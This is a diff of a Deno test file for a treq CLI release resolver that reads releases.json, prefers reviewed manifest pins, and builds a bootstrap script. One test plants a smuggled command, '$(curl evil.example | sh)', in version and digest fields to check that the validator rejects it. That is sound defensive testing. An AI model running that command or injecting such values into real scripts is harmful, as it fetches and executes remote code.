@@ -1,6 +1,6 @@
-// Which treq CLI release a machine bootstraps: the newest published GitHub
-// release with both Linux CLI assets, reviewed manifest pins first.
-// No network: fetch is a fake.
+// Which treq CLI release a machine bootstraps: the newest published release
+// in treq.dev/releases.json with both Linux CLI assets, reviewed manifest
+// pins first. No network: fetch is a fake.
 
 import { assert, assertEquals, assertRejects, assertStringIncludes } from "https://deno.land/std@0.224.0/assert/mod.ts";
 import { type BootManifest, bootstrapScript, CURRENT_MANIFEST_VERSION, manifestForVersion } from "../_shared/remote/boot-manifest.ts";
@@ -13,28 +13,33 @@ const X86 = "5d01af2aa81372a3e61cfb4b291393e6fb89f990554b162ba7cced241e1a04f3";
 const ARM = "3931e7f99caea1684d40d087369137040be5ab517a73830025195dfd7f11c87a";
 
 function cliAssets(v: string, arches = ["x86_64", "aarch64"]) {
-  return arches.map((arch) => ({
-    name: `treq-cli-${v}-linux-${arch}.tar.gz`,
-    digest: `sha256:${arch === "x86_64" ? X86 : ARM}`,
-  }));
+  return Object.fromEntries(arches.map((arch) => [`linux-${arch}`, {
+    url: `https://github.com/tznc/treq/releases/download/v${v}/treq-cli-${v}-linux-${arch}.tar.gz`,
+    sha256: arch === "x86_64" ? X86 : ARM,
+  }]));
 }
 
-function release(tag: string, opts: { draft?: boolean; prerelease?: boolean; assets?: unknown[] } = {}) {
+/** One entry of treq.dev/releases.json (schema 1). */
+function release(tag: string, opts: { prerelease?: boolean; assets?: unknown; version?: string } = {}) {
+  const version = opts.version ?? tag.replace(/^v/, "");
   return {
-    tag_name: tag,
-    draft: opts.draft ?? false,
+    version,
+    tag,
+    published_at: "2026-10-21T19:34:12Z",
     prerelease: opts.prerelease ?? false,
-    assets: opts.assets ?? cliAssets(tag.replace(/^v/, "")),
+    assets: opts.assets ?? cliAssets(version),
   };
 }
 
-function fakeFetch(answer: unknown[] | Response | Error) {
+/** A list of entries is wrapped in a schema 1 document; anything else is answered as is. */
+function fakeFetch(answer: unknown[] | Record<string, unknown> | Response | Error) {
   const urls: string[] = [];
   const fetch = ((input: string | URL | Request) => {
     urls.push(String(input));
     if (answer instanceof Error) return Promise.reject(answer);
     if (answer instanceof Response) return Promise.resolve(answer.clone());
-    return Promise.resolve(Response.json(answer));
+    const doc = Array.isArray(answer) ? { schema: 1, generated_at: "2026-11-15T00:00:00Z", releases: answer } : answer;
+    return Promise.resolve(Response.json(doc));
   }) as typeof globalThis.fetch;
   return { fetch, urls };
 }
@@ -52,9 +57,20 @@ Deno.test("the newest published release wins, by semver", async () => {
   assertEquals(r.source, "github");
 });
 
-Deno.test("a draft is skipped", async () => {
-  const r = await resolverFor([release("v0.4.0", { draft: true }), release("v0.3.0")])();
-  assertEquals(r.version, "0.3.0");
+Deno.test("a version, tag or digest that fails its pattern is skipped before it reaches the script", async () => {
+  const evil = "$(curl evil.example | sh)";
+  const r = await resolverFor([
+    release("v0.9.0", { version: `0.9.0";${evil};"` }),
+    release("v0.8.0", { version: "0.8.0" + "\n" }),
+    release("v0.7.1", { version: "0.7.0" }),
+    release("v0.7.0", { assets: { ...cliAssets("0.7.0"), "linux-aarch64": { url: "x", sha256: evil } } }),
+    release("v0.6.0", { assets: { ...cliAssets("0.6.0"), "linux-x86_64": { url: "x", sha256: X86.toUpperCase() } } }),
+    release("v0.5.0", { assets: "not an object" }),
+    "not an entry",
+    null,
+    release("v0.3.0"),
+  ])();
+  assertEquals(r, { version: "0.3.0", sha256: { x86_64: X86, aarch64: ARM }, source: "github" });
 });
 
 Deno.test("a prerelease and the nightly are skipped", async () => {
@@ -67,7 +83,7 @@ Deno.test("a prerelease and the nightly are skipped", async () => {
 });
 
 Deno.test("a release missing a Linux CLI asset or its digest falls back to the previous one", async () => {
-  const noDigest = cliAssets("0.4.1").map((a) => ({ ...a, digest: null }));
+  const noDigest = { ...cliAssets("0.4.1"), "linux-x86_64": { url: "x", sha256: null } };
   const r = await resolverFor([
     release("v0.4.1", { assets: noDigest }),
     release("v0.4.0", { assets: cliAssets("0.4.0", ["x86_64"]) }),
@@ -76,21 +92,27 @@ Deno.test("a release missing a Linux CLI asset or its digest falls back to the p
   assertEquals(r.version, "0.3.0");
 });
 
-Deno.test("reviewed manifest pins beat the digests GitHub reports", async () => {
+Deno.test("reviewed manifest pins beat the digests releases.json reports", async () => {
   const pinned = { ...unpinned, treq_version: "0.3.0", treq_sha256: { x86_64: "a".repeat(64), aarch64: "b".repeat(64) } };
   const r = await resolverFor([release("v0.3.0")], [pinned, unpinned])();
   assertEquals(r, { version: "0.3.0", sha256: pinned.treq_sha256, source: "manifest" });
 });
 
-Deno.test("a GitHub API failure throws a ProviderError when the manifest has no real pins", async () => {
-  for (const answer of [new Error("network down"), new Response("rate limited", { status: 403 }), []]) {
+Deno.test("an unreachable or malformed releases.json throws a ProviderError when the manifest has no real pins", async () => {
+  const malformed = [
+    {},
+    { schema: 2, releases: [release("v0.3.0")] },
+    { schema: 1, releases: { "0": release("v0.3.0") } },
+    new Response("<html>not json</html>", { status: 200 }),
+  ];
+  for (const answer of [new Error("network down"), new Response("gone", { status: 404 }), [], ...malformed]) {
     const err = await assertRejects(() => resolverFor(answer)(), ProviderError);
     assertEquals(err.kind, "unavailable");
     assertStringIncludes(err.message, "treq");
   }
 });
 
-Deno.test("a GitHub API failure falls back to the current manifest when it has real pins", async () => {
+Deno.test("a releases.json failure falls back to the current manifest when it has real pins", async () => {
   const pinned = { ...unpinned, treq_sha256: { x86_64: "a".repeat(64), aarch64: "b".repeat(64) } };
   const r = await resolverFor(new Response("boom", { status: 500 }), [pinned])();
   assertEquals(r, { version: "0.4.0", sha256: pinned.treq_sha256, source: "manifest" });
@@ -107,7 +129,14 @@ Deno.test("the resolved release is cached for about ten minutes", async () => {
   t = 11 * 60_000;
   await resolve();
   assertEquals(urls.length, 2);
-  assertStringIncludes(urls[0], "https://api.github.com/repos/tznc/treq/releases");
+  assertEquals(urls[0], "https://treq.dev/releases.json");
+});
+
+Deno.test("TREQ_RELEASES_URL overrides where releases.json is read from", async () => {
+  const { fetch, urls } = fakeFetch([release("v0.3.0")]);
+  const env = (key: string) => key === "TREQ_RELEASES_URL" ? "https://preview.example/releases.json" : undefined;
+  await createTreqReleaseResolver({ fetch, manifests: [unpinned], env })();
+  assertEquals(urls, ["https://preview.example/releases.json"]);
 });
 
 Deno.test("the bootstrap script carries the resolved version and digests, no placeholder", async () => {
@@ -118,7 +147,7 @@ Deno.test("the bootstrap script carries the resolved version and digests, no pla
       return Promise.resolve({ exitCode: 0, stdout: "", stderr: "" });
     },
   } as unknown as SandboxProvider;
-  await runBootManifest(provider, "m1", "bootstrap", resolverFor([release("v0.4.0", { draft: true }), release("v0.3.0")]));
+  await runBootManifest(provider, "m1", "bootstrap", resolverFor([release("v0.4.0", { prerelease: true }), release("v0.3.0")]));
   const script = defined(execs[0])[2];
   assertStringIncludes(script, 'TREQ_VERSION="0.3.0"');
   assertStringIncludes(script, `TREQ_SHA256_X86_64="${X86}"`);
